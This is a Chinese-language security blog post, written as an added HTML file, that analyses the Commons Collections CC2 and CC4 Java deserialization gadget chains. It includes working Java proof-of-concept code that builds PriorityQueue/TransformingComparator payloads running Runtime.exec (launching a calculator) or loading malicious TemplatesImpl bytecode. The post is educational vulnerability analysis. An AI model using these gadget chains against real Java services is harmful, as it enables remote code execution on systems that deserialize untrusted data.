@@ -1,0 +1,313 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Java反序列化大结局 —— CC链2+4 | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Java反序列化大结局 —— CC链2+4 | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="
+C.C你带我走吧😭
+
+CC2+4
+CommonsCollections4中的TransformingComparator类多了可以被序列化，这就让攻击路径多了一条。
+
+所以说它是CommonsCollections4版本可用，并不说原来..." />
+    <meta name="keywords" content="漏洞分析,Java反序列化,JAVA" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Java反序列化大结局 —— CC链2+4
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-10-20
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/XzhG4n-u0/" class="post-tag">
+                  # 漏洞分析
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/VnhegNlf7/" class="post-tag">
+                  # Java反序列化
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/RwDqGW2an/" class="post-tag">
+                  # JAVA
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/java-fan-xu-lie-hua-da-jie-ju-cc-lian-24.webp" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <blockquote>
+<p>C.C你带我走吧😭</p>
+</blockquote>
+<h1 id="cc24">CC2+4</h1>
+<p>CommonsCollections4中的<code>TransformingComparator</code>类多了可以被序列化，这就让攻击路径多了一条。<br>
+<img src="https://skyblu3519.github.io/post-images/1697731585074.png" alt="" loading="lazy"></p>
+<p>所以说它是CommonsCollections4版本可用，并不说原来的链就不能用了，只是4.0版本还可以用这个类来构造。</p>
+<p>然后这条链的利用有两种方法，其实都差不多，就变了一点点。</p>
+<p>和前面的一样，最后都是要调用到一个类的<code>transform</code>方法。<code>TransformingComparator</code>的<code>compare</code>方法就是我们的目标<br>
+<img src="https://skyblu3519.github.io/post-images/1697731599560.png" alt="" loading="lazy"></p>
+<p>然后找到一个类，它的<code>readObject</code>方法中调用了<code>compare</code>，同时这个调用的对像还可控。最后找到了<code>PriorityQueue</code>。</p>
+<p>它的调用链为：<code>readObject()</code> -&gt; <code>heapify()</code> -&gt; <code>siftDown(i, (E) queue[i])</code> -&gt; <code>siftDownUsingComparator(k, x)</code> -&gt; <code>comparator.compare((E) c, (E) queue[right]) &gt; 0)</code></p>
+<p>然后这个<code>comparator</code>在构造时传入，也是可控的<br>
+<img src="https://skyblu3519.github.io/post-images/1697731613968.png" alt="" loading="lazy"></p>
+<p>所以这个链的基本格式就是</p>
+<pre><code class="language-java">// 最后chainedTransformer.transform()就行
+TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
+PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);
+
+// 序列化priorityQueue类
+serialize(priorityQueue);
+unserialize(&quot;ser.bin&quot;);
+</code></pre>
+<p>然后要让这条链走通，我们还要修改些<code>priorityQueue</code>里面的内容。跟进readObject里的内容，就会发现只有一点阻塞点。<br>
+<img src="https://skyblu3519.github.io/post-images/1697731627287.png" alt="" loading="lazy"></p>
+<p><code>heapify</code>中为了执行到<code>siftDown</code>需要size &gt;= 2（右移1位，减1，不小于0）。同时这里和CC1一样，调用<code>transform</code>时往里面传了参数。</p>
+<p>所以关于解决上面的问题，就有两种方法。</p>
+<h2 id="cc4">CC4</h2>
+<p>在CC1中用<code>ChainedTransformer</code>+<code>ConstantTransformer</code>来无视传入的参数，这里也可以。这个执行命令的调用链随便在前面选一条就行。</p>
+<p>然后用反射来修改size</p>
+<pre><code class="language-java">PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);
+
+Class pc = priorityQueue.getClass();
+Field sizeField = pc.getDeclaredField(&quot;size&quot;);
+sizeField.setAccessible(true);
+sizeField.set(priorityQueue, 2);
+</code></pre>
+<p>完整代码</p>
+<pre><code class="language-java">public static void main(String[] args) throws Exception{
+    String cmd = &quot;open -a Calculator&quot;;
+    Class rc = Runtime.class;
+
+    ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
+            new ConstantTransformer(rc),
+            new InvokerTransformer(
+                    &quot;getMethod&quot;,
+                    new Class[]{String.class, Class[].class},
+                    new Object[]{&quot;getRuntime&quot;, null}
+            ),
+            new InvokerTransformer(
+                    &quot;invoke&quot;,
+                    new Class[]{Object.class, Object[].class},
+                    new Object[]{null, null}
+            ),
+            new InvokerTransformer(
+                    &quot;exec&quot;,
+                    new Class[]{String.class},
+                    new Object[]{cmd}
+            )
+    });
+
+    TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
+
+    PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);
+
+    Class pc = priorityQueue.getClass();
+    Field sizeField = pc.getDeclaredField(&quot;size&quot;);
+    sizeField.setAccessible(true);
+    sizeField.set(priorityQueue, 2);
+
+//        serialize(priorityQueue);
+    unserialize(&quot;ser.bin&quot;);
+
+}
+</code></pre>
+<h1 id="cc2">CC2</h1>
+<p>观察最后调用的地方，我们发现最后transform传入的参数也是可控的<br>
+<img src="https://skyblu3519.github.io/post-images/1697731643985.png" alt="" loading="lazy"></p>
+<p>这个<code>queue</code>在创建完<code>PriorityQueue</code>后可以用<code>add</code>方法传入。虽然感觉有点多次一举，但是这个方法让调用链中没了数组（<code>ChainedTransformer</code>所需要的）。</p>
+<p>比如CC3那条链，我们就可以直接用<code>InvokerTransformer</code>调用<code>TemplatesImpl</code>的<code>newTransformer</code>方法，不去走<code>TrAXFilter</code>+<code>InstantiateTransformer</code>最后让<code>ChainedTransformer.transform</code>调</p>
+<pre><code class="language-java">TemplatesImpl templates = new TemplatesImpl();
+// 反射修改必要的属性
+Class c = templates.getClass();
+Field nameField = c.getDeclaredField(&quot;_name&quot;);
+nameField.setAccessible(true);
+nameField.set(templates, &quot;skky&quot;);
+Field tfactoryField = c.getDeclaredField(&quot;_tfactory&quot;);
+tfactoryField.setAccessible(true);
+tfactoryField.set(templates, new TransformerFactoryImpl());
+Field bytecodesField = c.getDeclaredField(&quot;_bytecodes&quot;);
+bytecodesField.setAccessible(true);
+byte[] bytecode = Files.readAllBytes(Paths.get(&quot;/Users/ea5ter/Documents/CTF/code/javaWeb/CC1/src/main/java/Evil.class&quot;));       // Evil bytecode
+byte[][] bytecodes = {bytecode};
+bytecodesField.set(templates, bytecodes);
+
+InvokerTransformer&lt;Object, Object&gt; invokerTransformer = new InvokerTransformer&lt;&gt;(
+        &quot;newTransformer&quot;,
+        new Class[]{},
+        new Object[]{}
+);
+invokerTransformer.transform(templates);
+</code></pre>
+<p>让<code>TransformingComparator.compare</code>调<code>invokerTransformer.transform(templates)</code>，<code>templates</code>由我们手动传入。</p>
+<p>和<code>HashMap</code>一样<code>priorityQueue.add</code>也会走一遍恶意代码的执行流程，可以用反射绕过这个部分</p>
+<pre><code class="language-java">TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer&lt;&gt;(1));
+
+PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);
+
+priorityQueue.add(templates);
+priorityQueue.add(templates);
+
+Class tc = transformingComparator.getClass();
+Field transformerField = tc.getDeclaredField(&quot;transformer&quot;);
+transformerField.setAccessible(true);
+transformerField.set(transformingComparator, invokerTransformer);
+</code></pre>
+<h1 id="结语">结语</h1>
+<p>至此，整个Commons Collections反序列化利用全部结束。剩下的CC5+7其实也思路都差不多，就不再多赘述了（<s>想摆烂了</s>。</p>
+<p>最后附上我画的一张思维导图，over!<br>
+<img src="https://skyblu3519.github.io/post-images/1698254538469.png" alt="" loading="lazy"></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#cc24">CC2+4</a>
+<ul>
+<li><a href="#cc4">CC4</a></li>
+</ul>
+</li>
+<li><a href="#cc2">CC2</a></li>
+<li><a href="#%E7%BB%93%E8%AF%AD">结语</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/2023-xiang-shan-bei-php_unserialize_promeow_blog/">
+              <h3 class="post-title">
+                [2023香山杯]WEB WP
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
